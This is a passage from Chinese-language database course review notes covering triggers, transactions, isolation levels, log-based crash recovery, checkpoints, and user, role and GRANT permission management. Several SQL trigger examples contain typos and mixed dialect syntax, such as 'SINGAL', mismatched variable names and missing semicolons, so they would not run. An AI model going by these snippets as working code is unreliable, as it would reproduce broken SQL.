class="keyword">INTO</span> credit <span class="keyword">FROM</span> course <span class="operator">/</span><span class="operator">/</span>给这个整型变量赋值</span><br><span class="line"><span class="keyword">WHERE</span> courseld <span class="keyword">IN</span>(</span><br><span class="line"><span class="keyword">SELECT</span> courseld <span class="keyword">FROM</span> enroll</span><br><span class="line"><span class="keyword">WHERE</span> studentld<span class="operator">=</span><span class="variable">@new</span>.studentld</span><br><span class="line"><span class="keyword">AND</span> semester<span class="operator">=</span><span class="variable">@new</span>.semester) </span><br><span class="line"><span class="keyword">OR</span> couseld<span class="operator">=</span><span class="variable">@new</span>.courseld;</span><br><span class="line"><span class="keyword">WHEN</span>(creditAll<span class="operator">&gt;</span><span class="number">25</span>)<span class="operator">/</span><span class="operator">/</span>当大于<span class="number">25</span>分时，就会输出错误信息</span><br><span class="line">raise_application_error(<span class="number">200</span>,<span class="string">&#x27;这个学期已经选修学分&#x27;</span><span class="operator">+</span><span class="variable">@creditAll</span>);</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure><p>上面这个用于使用触发器实现每学期选课不超过25学分。</p><p><strong>DBMS内部，所有完整性约束，地使用触发器来表示</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WHEN</span> (<span class="keyword">NOT</span> EXIST <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> student <span class="keyword">WHERE</span> sudentNo <span class="operator">=</span> <span class="variable">@new</span>.studentNo <span class="keyword">OR</span>  <span class="keyword">NOT</span> EXIST <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> course <span class="keyword">WHERE</span> courseNo <span class="operator">=</span> <span class="variable">@new</span>.courseNo)</span><br><span class="line">           raise_application_error(“违背外键约束”);</span><br></pre></td></tr></table></figure><h4 id="11-删除或者修改中的一个对象"><a href="#11-删除或者修改中的一个对象" class="headerlink" title="11.删除或者修改中的一个对象"></a>11.删除或者修改中的一个对象</h4><blockquote><p>•<strong>DROP TABLE</strong> <strong>emp;</strong></p><p>•<strong>ALTER TABLE</strong> <strong>emp ……..;</strong></p><p>•<strong>DROP VIEW</strong> <strong>staff;</strong></p><p>•<strong>ALTER VIEW</strong> <strong>staff ……..;</strong></p><p>•<strong>DROP PROCEDURE</strong> <strong>add_enroll;</strong></p><p>•<strong>ALTER PROCEDURE</strong> <strong>add_enroll;</strong></p><p>•<strong>DROP TRIGGER</strong> <strong>staff_insert;</strong></p><p>•<strong>ALTER TRIGGER</strong> <strong>staff_insert;</strong></p></blockquote><h4 id="12-数据库中的对象"><a href="#12-数据库中的对象" class="headerlink" title="12.数据库中的对象"></a>12.数据库中的对象</h4><p>![image-20240408174225483](<a href="https://cdn.jsdelivr.net/Ycx6666">https://cdn.jsdelivr.net/Ycx6666</a> &#x2F; TyporaImage&#x2F;image-20240408174225483.png)</p><p>e.g.</p><p>假定Booking表漏定义了外键(hotelNo, roomNo), 请针对往Booking表中添加记录，写一个触发器实现此这2个字段的引用完整性；</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> Booking_trigger </span><br><span class="line">BEFORE <span class="keyword">INSERT</span> <span class="keyword">INTO</span> Booking</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DECLARE</span> room_exists <span class="type">INT</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">INTO</span> room_exists </span><br><span class="line"><span class="keyword">FROM</span> Room</span><br><span class="line"><span class="keyword">WHERE</span> hotelNo<span class="operator">=</span>new.hotel <span class="keyword">AND</span> roomNo<span class="operator">=</span>new.roomNo</span><br><span class="line">IF(room_exist<span class="operator">=</span><span class="number">0</span>) <span class="keyword">THEN</span></span><br><span class="line">SINGAL <span class="keyword">SQLSTATE</span> <span class="string">&#x27;45000&#x27;</span></span><br><span class="line"><span class="keyword">SET</span> MESSAGE_TEXT<span class="operator">=</span><span class="string">&#x27;外键引用错误&#x27;</span></span><br><span class="line"><span class="keyword">END</span> IF</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure><h4 id="13-约束检查–延迟约束"><a href="#13-约束检查–延迟约束" class="headerlink" title="13.约束检查–延迟约束"></a>13.约束检查–延迟约束</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deferred contraints</span><br></pre></td></tr></table></figure><h4 id="14-用户自定义数据类型"><a href="#14-用户自定义数据类型" class="headerlink" title="14.用户自定义数据类型"></a>14.用户自定义数据类型</h4><p>UDDT:</p><blockquote><p>保证数据一致性</p></blockquote><p>格式:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> domain 域名 数据类型</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> domain person<span class="operator">-</span>name <span class="type">char</span>(<span class="number">20</span>)</span><br></pre></td></tr></table></figure><p><strong>类似于C语言中的</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedf ADDRESS_LIST&#123;</span><br><span class="line"><span class="type">char</span> name[<span class="number">10</span>];</span><br><span class="line"><span class="type">char</span> telephone[<span class="number">20</span>];</span><br><span class="line"><span class="type">char</span> location[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line">ADDRESS_LIST tom;</span><br></pre></td></tr></table></figure><h3 id="七-事务（概念、性质和调度"><a href="#七-事务（概念、性质和调度" class="headerlink" title="七.事务（概念、性质和调度)"></a>七.事务（概念、性质和调度)</h3><h4 id="1-事务概念"><a href="#1-事务概念" class="headerlink" title="1.事务概念"></a>1.事务概念</h4><blockquote><p>事务是由一系列操作的序列构成的程序执行单元，这些操作要么都做，要么都不做，是一个不可分割的工作单位.</p></blockquote><p>&#x3D;&#x3D;SQL中事务的定义&#x3D;&#x3D;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">事务以<span class="keyword">Begin</span> transaction开始，以<span class="keyword">Commit</span> transaction或 <span class="keyword">Rollback</span> transaction结束（回滚，也就是撤销已经执行的那部分操作）</span><br><span class="line"><span class="keyword">Commit</span> transaction表示提交，事务正常结束</span><br><span class="line"><span class="keyword">Rollback</span> transaction表示事务非正常结束，撤消事务已做的操作，回滚到事务开始时状态</span><br></pre></td></tr></table></figure><h4 id="2-事务特征"><a href="#2-事务特征" class="headerlink" title="2.事务特征"></a>2.事务特征</h4><p>&#x3D;&#x3D;要求:中间状态对外部不可见&#x3D;&#x3D;</p><p><strong>例</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TRANSACTION <span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">UPDATE</span> account <span class="keyword">SET</span> balance <span class="operator">=</span> balance <span class="operator">+</span> <span class="number">10000</span></span><br><span class="line"><span class="keyword">WHERE</span> accountNo <span class="operator">=</span> <span class="string">&#x27;2008043101&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> account <span class="keyword">SET</span> balance <span class="operator">=</span> balance <span class="operator">-</span> <span class="number">10000</span></span><br><span class="line"><span class="keyword">WHERE</span> accountNo<span class="operator">=</span><span class="string">&#x27;2008043214&#x27;</span>;</span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;事务特性&#x3D;&#x3D; –一个DBMS支持事务的化，其所必须满足的特性</p><ul><li><strong>原子性</strong></li></ul><p>事务中包含的所有操作要么全做，要么全不做</p><p><strong>原子性由恢复机制实现</strong></p><ul><li><strong>一致性</strong></li></ul><p>在外部看来，数据库中的数据总是正确的,数据库的一致性状态<strong>由用户负责</strong>；</p><p>–数据正确性问题</p><p>-有故障时，数据会丢失或者残缺不全</p><p>-无故障时，因为数据阻止不合理，导致数据更新异常，冗余，数据不正确；</p><ul><li><strong>隔离性</strong></li></ul><p>– 系统必须保证事务不受其它并发执行事务的影响</p><p>– 对任何一对事务T1，T2，在T1看来，T2要么在T1开始之前已经结束，要么在T1完成之后再开始执行</p><p>– 隔离性通过<strong>并发控制机制</strong>实现</p><ul><li><strong>持久性</strong></li></ul><p>一个事务一旦提交之后，他对数据库的影响必须是永久的</p><p>系统发生故障不能改变事务的持久性</p><p>持久性通过恢复机制实现</p><blockquote><p>一个事务一旦提交了，即使随后发生故障，其结果不会在数据库中丢失</p></blockquote><h4 id="3-事务生命周期图"><a href="#3-事务生命周期图" class="headerlink" title="3.事务生命周期图"></a>3.事务生命周期图</h4><p><img src="/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/../../../Typora/Project/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%EF%BC%885-8%EF%BC%89.assets/NvYt7VwBHFJqjuG.png" alt="image-20240412101836367"></p><h4 id="4-事务调度及其分类"><a href="#4-事务调度及其分类" class="headerlink" title="4.事务调度及其分类"></a>4.事务调度及其分类</h4><blockquote><p>有多个事务需要执行时，这组事务对应的的所有操作的执行顺序称为对这组事务的一个调度，表示事务的指令在系统中执行的时间顺序</p></blockquote><h5 id="一组事务的调度必须保证"><a href="#一组事务的调度必须保证" class="headerlink" title="一组事务的调度必须保证"></a>一组事务的调度必须保证</h5><ul><li>包含了该组所有事务的操作指令</li><li>同一个事务中的指令，再调度中的先后顺序，同其在事务内部的先后顺序必须保持一致</li></ul><h5 id="串行调度"><a href="#串行调度" class="headerlink" title="串行调度"></a>串行调度</h5><ul><li>在串行调度中，属于同一事务的指令紧凑在一起</li><li>对于有n个事务的事务组，可以有n！个不同的串行调度</li></ul><h5 id="并行调度"><a href="#并行调度" class="headerlink" title="并行调度"></a>并行调度</h5><ul><li>在并行调度中，来自不同事物的指令可以交叉执行</li><li>当并行调度等价于某个串行调度时，则称他是正确的。</li></ul><h4 id="5-事务调度"><a href="#5-事务调度" class="headerlink" title="5.事务调度"></a>5.事务调度</h4><p><strong>并行和串行</strong></p><p>&#x3D;&#x3D;基本比较&#x3D;&#x3D;</p><ul><li>并行十五容易破坏数据库的一致性</li><li>串行事务效率低</li></ul><p>&#x3D;&#x3D;并行的优点&#x3D;&#x3D;</p><ul><li>一个事务由不同的步骤组成，所涉及的系统资源也不同。这些步骤可以并发执行，以提高系统的<strong>吞吐量</strong></li><li>系统中存在着周期不等的各种事务，串行会导致难于预测的时延。如果各个事务所涉及的是数据库的不同部分，采用并发会减少<strong>平均响应时间</strong>（例如事务操作的表各不相同）</li></ul><p>&#x3D;&#x3D;总结&#x3D;&#x3D;</p><blockquote><p>事务可以提高系统的吞吐量，也会减少响应时间</p></blockquote><h4 id="6-可恢复调度"><a href="#6-可恢复调度" class="headerlink" title="6.可恢复调度"></a>6.可恢复调度</h4><h5 id="事物的恢复"><a href="#事物的恢复" class="headerlink" title="事物的恢复"></a>事物的恢复</h5><blockquote><p><strong>事务的恢复</strong>：一个事务失败了，为保证事务的原子性，我们应该能够撤消（回滚）该事务对数据库已经造成的影响，如write过的数据项。如果有其它事务Tx读取了失败事务写入的数据，则该事务Tx也应该撤消（前提是Tx尚未commit，如果已经commited，那么就无法恢复，出现不一致）</p></blockquote><p><strong>注：</strong></p><blockquote><p>对于每对事物T1和T2，如果T2读取了T1所写的数据，则T1必须先于T2提交</p></blockquote><h5 id="级联回滚："><a href="#级联回滚：" class="headerlink" title="级联回滚："></a>级联回滚：</h5><p>应该避免级联回滚</p><h4 id="7-无级联回滚-–不会发生级联回滚的调度"><a href="#7-无级联回滚-–不会发生级联回滚的调度" class="headerlink" title="7.无级联回滚 –不会发生级联回滚的调度"></a>7.无级联回滚 –不会发生级联回滚的调度</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><blockquote><p>对于每对事物T1和T2，如果T2读取了T1所写的数据，则T1必须先于T2提交</p></blockquote><h4 id="8-Write和Commit"><a href="#8-Write和Commit" class="headerlink" title="8.Write和Commit"></a>8.Write和Commit</h4><h5 id="Write又称save：临时性"><a href="#Write又称save：临时性" class="headerlink" title="Write又称save：临时性"></a>Write又称save：临时性</h5><p>将数据项的值从内存中写入到数据库中，同时会备份好旧值，以便事务失败的时候需要回滚（将旧值写回该数据项），因此Write对数据库的修改是临时性的</p><h5 id="Commit：永久性"><a href="#Commit：永久性" class="headerlink" title="Commit：永久性"></a>Commit：永久性</h5><p>事务提交之后，会终止该事务，并且所有的备份旧值会被清除，事务对数据项的修改（Write）将因为commit的完成，实现由临时性变为永久性。</p><h4 id="9-事务隔离性级别"><a href="#9-事务隔离性级别" class="headerlink" title="9.事务隔离性级别"></a>9.事务隔离性级别</h4><p><strong>数据库事务的个隔离级别有4种，由高到低为</strong></p><ol><li>Serializable（可串行化)</li><li>Repeatable read (可重复读)</li><li>Read committed (读提交)</li><li>Read uncommitted (读未提交)</li></ol><p><strong>特点：</strong></p><ol><li>级别越低越容易出现不一致，性能越高</li><li>越高级越不容易出错，性能越低</li></ol><blockquote><p><strong>有些业务场景中允许将</strong>DBMS事务隔离性级别配置为非最高级（非可串行化），进而实现更高的性能</p></blockquote><h4 id="10-事务问题"><a href="#10-事务问题" class="headerlink" title="10.事务问题"></a>10.事务问题</h4><h5 id="丢失修改"><a href="#丢失修改" class="headerlink" title="丢失修改"></a>丢失修改</h5><blockquote><p>两个事务T1和T2读入同一数据并修改，T1提交的结果破坏了T2提交的结果，导致T2的修改丢失</p></blockquote><h5 id="读脏数据"><a href="#读脏数据" class="headerlink" title="读脏数据"></a>读脏数据</h5><blockquote><p>事务T1修改某一数据，并将其写回磁盘，事务T2读取同一数据后，T1由于某种原因被撤消，这时T1已修改过的数据恢复原值，T2读到的数据与数据库中数据不一致，则T2读到的数据就是脏数据</p></blockquote><h5 id="不能重复读-–修改其他事务读取的-update"><a href="#不能重复读-–修改其他事务读取的-update" class="headerlink" title="不能重复读  –修改其他事务读取的 update"></a>不能重复读  –修改其他事务读取的 update</h5><blockquote><p>事务T2读取某一数据后，事务T1对其做了修改，当T2再次读取该数据时，得到与前次不同的值，重复读导致不同值则表示出错，即不能重复读</p></blockquote><h5 id="发生幻象-–插入其他事务读的-insert-delete"><a href="#发生幻象-–插入其他事务读的-insert-delete" class="headerlink" title="发生幻象  –插入其他事务读的 insert&#x2F;delete"></a>发生幻象  –插入其他事务读的 insert&#x2F;delete</h5><blockquote><p>事务T2按一定条件读取了某些数据后，事务T1插入了一些满足这些条件的数据，当T2再次按相同条件读取数据时，发现多了一些记录</p></blockquote><h4 id="11-隔离性级别的定义"><a href="#11-隔离性级别的定义" class="headerlink" title="11.隔离性级别的定义"></a>11.隔离性级别的定义</h4><ul><li>serializable:一个调度的执行必须等价于一个串行调度的结果</li><li>repeatable read :只允许读取已提交的记录，并要求调度中，一个事务对同一记录的两次读取之间，不存在其他事务对该记录的更新</li><li>read committed： 只允许读取已提交的记录，但不要求可重复读</li><li>read uncommitted: 允许读取未提交的记录</li></ul><h4 id="12-故障恢复"><a href="#12-故障恢复" class="headerlink" title="12.故障恢复"></a>12.故障恢复</h4><ul><li>正常执行时的防备措施，为故障恢复做准备</li><li>在故障发生后的故障回复措施，保证事物的四个属性</li></ul><h5 id="分页方法："><a href="#分页方法：" class="headerlink" title="分页方法："></a>分页方法：</h5><ol><li>把要访问的数据页读入内存</li><li>数据处理</li><li>把修改了的数据页作为一个新页写回磁盘，注意不要覆盖旧页</li><li>完成第三步之后，在磁盘上删除过时了的旧页</li></ol><p><img src="/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/../../../Typora/Project/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%EF%BC%885-8%EF%BC%89.assets/ivgL5HD3FR6JplY.png" alt="image-20240412113027132"></p><p>&#x3D;&#x3D;优点&#x3D;&#x3D;:<strong>简单</strong></p><blockquote><p> <strong>故障恢复方法：如果因故障导致第3步没有完成，那么原数据页还在，就当该事物没有发生看待，保证了事物的原子性；</strong></p></blockquote><p>&#x3D;&#x3D;缺点&#x3D;&#x3D;:<strong>效率不高</strong></p><blockquote><p> <strong>原因是：磁头要在磁盘盘面上到处来回移动。因为磁头一会要读事物要处理的数据页，一会要去磁盘上的哪个地方找一个空闲页来写修改后的数据，还要回过头来删除旧页。</strong></p></blockquote><h5 id="日志方法-广泛采用"><a href="#日志方法-广泛采用" class="headerlink" title="日志方法(广泛采用)"></a>日志方法(广泛采用)</h5><p>数据库数据的特点：既要读，也要写</p><p>日志数据的特点：单调策略，只写不读</p><p><img src="/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/../../../Typora/Project/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%EF%BC%885-8%EF%BC%89.assets/et3RPIDspc2g1mu.png" alt="image-20240412113525506"></p><p><strong>将日志缓冲区的内容输出到日志磁盘</strong></p><p><strong>有两种同步约束：</strong></p><p>1）当数据库缓冲区中的某个内容要输出到数据库磁盘时，必须先把与其相关的日志缓冲区内容输出到日志磁盘(WAL ) ；</p><p><strong>数据库缓冲区中数据要输出到磁盘，是因为当要从磁盘中读数据到内存空间来进行处理时，必须先为其先腾出空间来；</strong></p><p><strong>2）当事务</strong> Ti 完成，遇到<Ti commit>记录时，要把日志缓冲区的内容输出到日志磁盘，以便保证事物的四个属性；</Ti></p><p>例子：<br><img src="/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/../../../Typora/Project/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%EF%BC%885-8%EF%BC%89.assets/Tw6XYeFWzxUNCEq.png" alt="image-20240412210837657"></p><h4 id="13-事务故障的恢复方法"><a href="#13-事务故障的恢复方法" class="headerlink" title="13.事务故障的恢复方法"></a>13.事务故障的恢复方法</h4><h5 id="特征：事务不能执行下去，未完成"><a href="#特征：事务不能执行下去，未完成" class="headerlink" title="特征：事务不能执行下去，未完成"></a>特征：事务不能执行下去，未完成</h5><p><strong>恢复方法：</strong></p><blockquote><p>恢复方法：执行回卷(Rollback)操作：当事物Ti要撤销时，反向扫描日志内容，对Ti的每项数据操作记录，执行undo(Ti) 操作，使用旧值恢复数据项的原有值，即撤销事务已做的数据操作；直至遇到<Ti start> 记录为止，然后放弃Ti ；</Ti></p></blockquote><h4 id="14-系统崩溃故障的恢复方法"><a href="#14-系统崩溃故障的恢复方法" class="headerlink" title="14.系统崩溃故障的恢复方法"></a>14.系统崩溃故障的恢复方法</h4><ol><li>重启数据库管理系统</li><li>从日志磁盘读取日志文件</li><li>反向扫描日志，从日志文件的结束位置开始反向扫描，对于在日志中没有&lt;Ti，commit&gt;的事务，执行回滚操作，使用旧值恢复数据项。做undo()处理。</li><li>然后从日志文件的开始位置向前扫描，对日志记录中含有 &lt;Ti,commit&gt;的事务，执行redo(Ti)操作，使用新值赋值数据库中的数据项， 保证事务的生效性。</li></ol><h4 id="15-检查点-Checkpoint-概念"><a href="#15-检查点-Checkpoint-概念" class="headerlink" title="15.检查点(Checkpoint)概念"></a>15.检查点(Checkpoint)概念</h4><p>做检查点的目的：</p><blockquote><p>加快系统崩溃故障恢复过程，基于如下观察</p></blockquote><ul><li>扫描整个日志文件很费时</li><li>对已经输出到了数据库磁盘的事务数据项没有必要做redo操作</li></ul><p><strong>周期性的做检查点</strong></p><ol><li>暂停当前所有活动事务</li><li>把日志缓冲区的所有日志记录输出带日志磁盘</li><li>把数据库缓冲区的所有修改输出到数据库磁盘</li><li>写一条&lt;checkpoint,&lt;当前活动事务的标识号列表&gt;&gt;日志记录到日志磁盘。</li></ol><h4 id="16-有检查点的系统崩溃故障恢复"><a href="#16-有检查点的系统崩溃故障恢复" class="headerlink" title="16.有检查点的系统崩溃故障恢复"></a>16.有检查点的系统崩溃故障恢复</h4><ol><li>从日志文件的结尾处反向扫描，直到遇到最近的<checkpoint>记录为止</checkpoint></li><li>对反向扫描中只有<Tistart>，而没有<Ti commit>的事务，执行回滚操作，做撤销处理</Ti></Tistart></li><li>从<checkpoint>开始向前扫描日志记录，对有<Ticommit>的事务，执行redo<Ti>操作。</Ti></Ticommit></checkpoint></li></ol><blockquote><p>没有检查点时，日志文件反向扫描要到起始位置。检查点加快了故障恢复过程，缩短了恢复时间；</p></blockquote><p>例子：</p><p><img src="/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/../../../Typora/Project/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%EF%BC%885-8%EF%BC%89.assets/hpQrRmZVwSf9g3t.png" alt="image-20240412212101160"></p><h4 id="17-备份操作-应对数据库磁盘故障"><a href="#17-备份操作-应对数据库磁盘故障" class="headerlink" title="17.备份操作-应对数据库磁盘故障"></a>17.备份操作-应对数据库磁盘故障</h4><p><strong>周期性地执行备份(dump) 操作，对磁盘数据库进行磁盘备份:</strong></p><p><strong>①不再接收客户事务请求，让当前所有活动事务执行完毕；</strong></p><p><strong>②输出日志缓冲区中的日志记录到日志磁盘中;</strong></p><p><strong>③输出数据库缓冲区中的缓冲数据到数据库磁盘中;</strong></p><p><strong>④把数据库磁盘中的数据库文件拷贝到另一个磁盘上；</strong></p><p><strong>⑤往日志磁盘中写入一条 <dump> 日志记录；</dump></strong></p><p>⑥<strong>接收客户事物请求，恢复正常处理；</strong></p><h4 id="18-数据库磁盘故障的回复方法"><a href="#18-数据库磁盘故障的回复方法" class="headerlink" title="18.数据库磁盘故障的回复方法"></a>18.数据库磁盘故障的回复方法</h4><p><strong>特征</strong></p><p>数据库数据全部丢失</p><p><strong>恢复方法</strong></p><ol><li>用最近备份的数据库磁盘替换掉失效的数据库磁盘</li><li>重启数据库管理系统</li><li>读日志文件，从文件末尾反向扫描直至<dump>记录；</dump></li><li>再顺向扫描日志记录，对有<Ticomit>记录的事务做redo(Ti)操作</Ticomit></li></ol><p>例子</p><p>![image-20240412212431459](<a href="https://cdn.jsdelivr.net/Ycx6666">https://cdn.jsdelivr.net/Ycx6666</a> &#x2F; TyporaImage&#x2F;G2STxwgUXbnulhJ.png)</p><h3 id="八-数据库安全保障技术"><a href="#八-数据库安全保障技术" class="headerlink" title="八.数据库安全保障技术"></a>八.数据库安全保障技术</h3><h4 id="1-绪论"><a href="#1-绪论" class="headerlink" title="1.绪论"></a>1.绪论</h4><p>•企业的一切信息，活动，财富，都以数据来记载和体现，另外，所有用户的一切信息，活动，财富也都以数据来记载和体现；</p><p>•数据都存储在数据库的表中；</p><p>•数据要有安全性，就必须对每个访问数据库的用户标识其身份，明确其能访问的数据。对其能访问的数据，还要进一步明确能执行什么样的数据操作。只有这样，数据安全性才有保障。</p><p>•安全保障机制必须简单明了，而且完备，安全管理才不会出现漏洞，切实可靠。</p><h4 id="2-三道防线"><a href="#2-三道防线" class="headerlink" title="2.三道防线"></a>2.三道防线</h4><p><img src="/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/../../../Typora/Project/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%EF%BC%885-8%EF%BC%89.assets/fOUxbondpJmI1Fe.png" alt="image-20240412212710034"></p><h4 id="3-访问权限管理机制"><a href="#3-访问权限管理机制" class="headerlink" title="3.访问权限管理机制"></a>3.访问权限管理机制</h4><blockquote><p>用户登录后，要访问数据库中的每一个对象，还有权限要求，权限的授予可以用**&lt;授予者，对象，权限，被授予者&gt;**四元组来表示</p></blockquote><h5 id="权限管理有三条准则："><a href="#权限管理有三条准则：" class="headerlink" title="权限管理有三条准则："></a>权限管理有三条准则：</h5><ol><li>某个对象，其创建者拥有对其的<strong>全部权限</strong>;</li><li>一个用户可以将其拥有的权限<strong>授予给其他用户</strong>；</li><li>授权这可<strong>收回其授予出去的权限</strong>，权限的收回具有<strong>连带性</strong>。</li></ol><h4 id="4-审计"><a href="#4-审计" class="headerlink" title="4.审计"></a>4.审计</h4><p><strong>•数据库中的另一种安全机制是审计</strong>(Audit)<strong>。审计就如在公共场所安装摄像机，对登录进数据库的用户的一举一动都进行记录。一旦发现安全问题，就可调阅审计记录，查清事实真相。</strong></p><h4 id="5-访问权限管理细则的建立"><a href="#5-访问权限管理细则的建立" class="headerlink" title="5.访问权限管理细则的建立"></a>5.访问权限管理细则的建立</h4><blockquote><p><strong>设计人员</strong>定义数据库中的<strong>表模式</strong>，明确<strong>用户类型</strong>，明确每类用户的<strong>业务需求</strong>，并给出每项<strong>业务需求与表的映射关系</strong>。</p></blockquote><p>例如，对于大学教务数据库，用户类别有<strong>学生，老师，教管</strong>。</p><p>•<strong>学生类</strong>用户，其<strong>业务需求</strong>包括查阅可选课，选课，查阅成绩，查阅已修课程清单及成绩，已修学分等。</p><p>•<strong>老师类</strong>用户，其<strong>业务需求</strong>包括开课申请，获取选修学生名单，登录成绩，查阅自己的开课记录，统计自己年教学工作量等。</p><p>•<strong>教管类</strong>用户，<strong>业务需求</strong>：课程、学生、老师管理（包括添加，修改，删除)，给学生分班，查阅学生选课情况，查阅老师授课情况，成绩排名等。</p><h4 id="6-访问权限管理细则的实施"><a href="#6-访问权限管理细则的实施" class="headerlink" title="6.访问权限管理细则的实施"></a>6.访问权限管理细则的实施</h4><blockquote><p><strong>设计人员</strong>明确了<strong>用户类别</strong>，<strong>业务需求</strong>，<strong>映射关系</strong>，也就明确了每类用户<strong>要访问的对象</strong>，以及对其应具有的<strong>操作权限</strong>。</p></blockquote><blockquote><p><strong>数据库管理人员</strong>(DBA)的一项只要职责就是将设计在数据库中贯彻落实，也就是在数据库中创建表，创建用户类别，然后为每个用户类别指定其能访问的对象，明确其操作权限<strong>。</strong></p></blockquote><blockquote><p><strong>DBA的另一项职责是管理</strong>每类用户的实例，也就是在数据库中为每个用户创建一个账号，再确定其所属的用户类别。在SQL语言中，用户类别被叫做角色ROLE<strong>。</strong></p></blockquote><h4 id="7-数据库中访问权限的管理粒度"><a href="#7-数据库中访问权限的管理粒度" class="headerlink" title="7.数据库中访问权限的管理粒度"></a>7.数据库中访问权限的管理粒度</h4><h5 id="对数据中的表"><a href="#对数据中的表" class="headerlink" title="对数据中的表"></a>对数据中的表</h5><ul><li><p>读权限：SELECT 粒度：表</p></li><li><p>更新权限：INSERT,UPDATE. 粒度：表，还可以进一步<strong>指定到列</strong></p><p>DELETE; 粒度：表</p></li></ul><blockquote><p>•<strong>DBMS中的权限管理</strong>是<strong>粗放型的</strong>。粒度并没有细化到表中的<strong>行</strong>。对于SELECT权限，也没有细化到<strong>列</strong>。<strong>并不能满足业务需求</strong>。</p></blockquote><p><strong>•细化的其它辅助措施：视图，存储过程，应用程序；</strong></p><h4 id="8-数据库中存储权限的数据结构"><a href="#8-数据库中存储权限的数据结构" class="headerlink" title="8.数据库中存储权限的数据结构"></a>8.数据库中存储权限的数据结构</h4><p>![image-20240412213750895](<a href="https://cdn.jsdelivr.net/Ycx6666">https://cdn.jsdelivr.net/Ycx6666</a> &#x2F; TyporaImage&#x2F;rBW76sXcJMNhzH3.png)</p><h4 id="9-创建用户和角色"><a href="#9-创建用户和角色" class="headerlink" title="9.创建用户和角色"></a>9.创建用户和角色</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> jj IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> ROLE teacher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span> jj;</span><br><span class="line"><span class="keyword">DROP</span> ROLE teacher;</span><br></pre></td></tr></table></figure><h4 id="10-授权"><a href="#10-授权" class="headerlink" title="10.授权"></a>10.授权</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> dept <span class="keyword">TO</span> PUBLIC;<span class="operator">/</span><span class="operator">/</span>给予所有用户(PUBLIC)访问部门表（dept）查询</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">UPDATE</span>(salary) <span class="keyword">ON</span> Emp <span class="keyword">TO</span> Manager; <span class="operator">/</span><span 